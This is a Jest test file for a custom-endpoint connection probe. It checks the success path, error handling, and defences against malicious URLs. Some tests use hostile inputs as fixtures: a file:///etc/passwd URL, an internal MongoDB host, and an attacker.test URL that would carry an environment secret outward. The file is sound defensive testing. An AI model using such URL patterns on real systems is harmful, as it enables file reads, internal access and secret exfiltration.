/**
 * Phase 9 — Test Connection probe.
 *
 * Mock fetch via `fetchFn` injection. Verifies happy path,
 * non-200 mapping, abort/timeout mapping, malicious-URL rejection
 * before any HTTP call, and Authorization header construction.
 */
import { probeCustomEndpoint } from '../probe';
import type { TCustomEndpointConfig } from 'librechat-data-provider';

const validConfig = (over: Partial<TCustomEndpointConfig> = {}): TCustomEndpointConfig =>
  ({
    name: 'ollama-local',
    apiKey: 'sk-test',
    baseURL: 'http://localhost:11434/v1',
    models: { default: ['x'] },
    ...over,
  }) as TCustomEndpointConfig;

const okResponse = (body: unknown): Response =>
  new Response(JSON.stringify(body), {
    status: 200,
    headers: { 'Content-Type': 'application/json' },
  });

describe('probeCustomEndpoint — happy path', () => {
  it('reports modelsDetected when /models returns OpenAI shape', async () => {
    const fetchFn = jest.fn(async () =>
      okResponse({ data: [{ id: 'x' }, { id: 'y' }, { id: 'z' }] }),
    );
    const result = await probeCustomEndpoint(validConfig(), { fetchFn: fetchFn as unknown as typeof fetch });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.modelsDetected).toBe(3);
      expect(typeof result.durationMs).toBe('number');
    }
  });

  it('returns ok even when body is not OpenAI-shaped JSON', async () => {
    const fetchFn = jest.fn(async () => new Response('not json', { status: 200 }));
    const result = await probeCustomEndpoint(validConfig(), { fetchFn: fetchFn as unknown as typeof fetch });
    expect(result.ok).toBe(true);
  });

  it('attaches Authorization Bearer header when apiKey is concrete', async () => {
    const fetchFn = jest.fn(async () => okResponse({ data: [] }));
    await probeCustomEndpoint(validConfig({ apiKey: 'sk-real' }), {
      fetchFn: fetchFn as unknown as typeof fetch,
    });
    const init = (fetchFn.mock.calls[0] as unknown as [string, RequestInit])[1];
    expect((init.headers as Record<string, string>).Authorization).toBe('Bearer sk-real');
  });

  it('omits Authorization when apiKey is the user_provided sentinel', async () => {
    const fetchFn = jest.fn(async () => okResponse({ data: [] }));
    await probeCustomEndpoint(validConfig({ apiKey: 'user_provided' }), {
      fetchFn: fetchFn as unknown as typeof fetch,
    });
    const init = (fetchFn.mock.calls[0] as unknown as [string, RequestInit])[1];
    expect((init.headers as Record<string, string>).Authorization).toBeUndefined();
  });

  it('forwards custom headers from config', async () => {
    const fetchFn = jest.fn(async () => okResponse({ data: [] }));
    await probeCustomEndpoint(
      validConfig({ headers: { 'X-Org': 'acme' } }),
      { fetchFn: fetchFn as unknown as typeof fetch },
    );
    const init = (fetchFn.mock.calls[0] as unknown as [string, RequestInit])[1];
    expect((init.headers as Record<string, string>)['X-Org']).toBe('acme');
  });
});

describe('probeCustomEndpoint — failures', () => {
  it('maps non-200 to ok=false with status', async () => {
    const fetchFn = jest.fn(async () =>
      new Response('unauthorized', { status: 401, statusText: 'Unauthorized' }),
    );
    const result = await probeCustomEndpoint(validConfig(), { fetchFn: fetchFn as unknown as typeof fetch });
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.status).toBe(401);
      expect(result.reason).toContain('401');
    }
  });

  it('maps fetch network error to ok=false', async () => {
    const fetchFn = jest.fn(async () => {
      throw new TypeError('connect ECONNREFUSED');
    });
    const result = await probeCustomEndpoint(validConfig(), { fetchFn: fetchFn as unknown as typeof fetch });
    expect(result.ok).toBe(false);
  });

  it('rejects malicious schemes before any fetch call', async () => {
    const fetchFn = jest.fn(async () => okResponse({ data: [] }));
    const result = await probeCustomEndpoint(
      { ...validConfig(), baseURL: 'file:///etc/passwd' },
      { fetchFn: fetchFn as unknown as typeof fetch },
    );
    expect(result.ok).toBe(false);
    expect(fetchFn).not.toHaveBeenCalled();
  });

  it('rejects internal-service hostname before fetch', async () => {
    const fetchFn = jest.fn(async () => okResponse({ data: [] }));
    const result = await probeCustomEndpoint(
      { ...validConfig(), baseURL: 'http://mongodb:27017/v1' },
      { fetchFn: fetchFn as unknown as typeof fetch },
    );
    expect(result.ok).toBe(false);
    expect(fetchFn).not.toHaveBeenCalled();
  });

  it('rejects loopback when allowLocalAddresses is false', async () => {
    const fetchFn = jest.fn(async () => okResponse({ data: [] }));
    const result = await probeCustomEndpoint(validConfig(), {
      fetchFn: fetchFn as unknown as typeof fetch,
      allowLocalAddresses: false,
    });
    expect(result.ok).toBe(false);
    expect(fetchFn).not.toHaveBeenCalled();
  });

  it('returns ok=false with "Probe timed out" reason on AbortError', async () => {
    const fetchFn = jest.fn(async () => {
      const err = new Error('aborted');
      (err as { name: string }).name = 'AbortError';
      throw err;
    });
    const result = await probeCustomEndpoint(validConfig(), { fetchFn: fetchFn as unknown as typeof fetch });
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.reason).toMatch(/timed out/i);
    }
  });

  it('rejects when baseURL is empty', async () => {
    const result = await probeCustomEndpoint({ ...validConfig(), baseURL: '' });
    expect(result.ok).toBe(false);
  });
});

describe('probeCustomEndpoint — anti-exfil (review H3)', () => {
  it('refuses to resolve ${VAR} placeholders inside baseURL', async () => {
    // If the probe resolved this, it would send a GET to
    // https://attacker.test/<resolved env var>/models — a textbook
    // exfil. The probe must reject the URL outright instead.
    process.env.PHASE_9_TEST_SECRET = 'sk-leak-me';
    try {
      const fetchFn = jest.fn(async () => okResponse({ data: [] }));
      const result = await probeCustomEndpoint(
        {
          ...validConfig(),
          baseURL: 'https://attacker.test/${PHASE_9_TEST_SECRET}',
        },
        { fetchFn: fetchFn as unknown as typeof fetch },
      );
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.reason).toMatch(/\$\{|placeholder|literal/i);
      }
      expect(fetchFn).not.toHaveBeenCalled();
    } finally {
      delete process.env.PHASE_9_TEST_SECRET;
    }
  });

  it('refuses to resolve ${VAR} placeholders inside header values', async () => {
    process.env.PHASE_9_TEST_TOKEN = 'sk-leak-me';
    try {
      const fetchFn = jest.fn(async () => okResponse({ data: [] }));
      await probeCustomEndpoint(
        {
          ...validConfig(),
          headers: {
            'X-Forwarded': '${PHASE_9_TEST_TOKEN}',
            'X-Static': 'not-secret',
          },
        },
        { fetchFn: fetchFn as unknown as typeof fetch },
      );
      const init = (fetchFn.mock.calls[0] as unknown as [string, RequestInit])[1];
      const headers = init.headers as Record<string, string>;
      expect(headers['X-Forwarded']).toBeUndefined();
      expect(headers['X-Static']).toBe('not-secret');
    } finally {
      delete process.env.PHASE_9_TEST_TOKEN;
    }
  });

  it('strips a trailing /models from the baseURL before appending (review L1)', async () => {
    const fetchFn = jest.fn(async () => okResponse({ data: [] }));
    await probeCustomEndpoint(
      { ...validConfig(), baseURL: 'http://localhost:11434/v1/models' },
      { fetchFn: fetchFn as unknown as typeof fetch },
    );
    const url = (fetchFn.mock.calls[0] as unknown as [string, RequestInit])[0];
    expect(url).toBe('http://localhost:11434/v1/models');
    expect(url).not.toContain('/models/models');
  });
});
